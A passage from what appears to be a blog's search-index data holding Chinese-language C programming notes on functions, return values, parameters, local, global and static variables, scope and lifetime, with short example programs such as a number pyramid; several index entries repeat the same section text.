begin, end, sum); } int main() { sum(1, 10); sum(20, 30); return 0; } 什么是函数一块代码，接受零个或多个参数做一件事，并返回零个或一个值 调用函数 函数名(参数值)； ()起到了表示函数调用的作用 即使没有参数也要加() 从函数中返回值\rreturn的作用 结束函数的运行 带着运算结果返回主调函数 但当函数产生了多个运算结果，就不能用return来返回 后面会介绍使用全局变量和指针实现函数多个结果返回 但若函数中出现两个ruturn语句，则只能执行一个，return之后的语句将不会被执行 return 表达式; #include int max(int a, int b) { int ret; if (a \u003e b) { ret = a; } else { ret = b; } return ret; } 没有返回值的函数void 函数名(参数表) 不能使用带值的return 可以没有return(或者return无表达式)，调用的时候不能做返回值的赋值 由于没有返回结果，函数调用不可能出现在表达式中，通常以独立的调用语句方式，如pyramid(n); ","date":"2023-11-17","objectID":"/c_language_notes/:7:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#没有返回值的函数"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include\u003cstdio.h\u003e int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include\u003cstdio.h\u003e void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#72函数的参数和变量"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#函数先后关系"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#函数原型"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#调用函数-1"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#传值"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#本地变量"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#全局变量和局部变量"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#变量的生存期作用域"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#变量储存的内存分布"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#静态变量"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 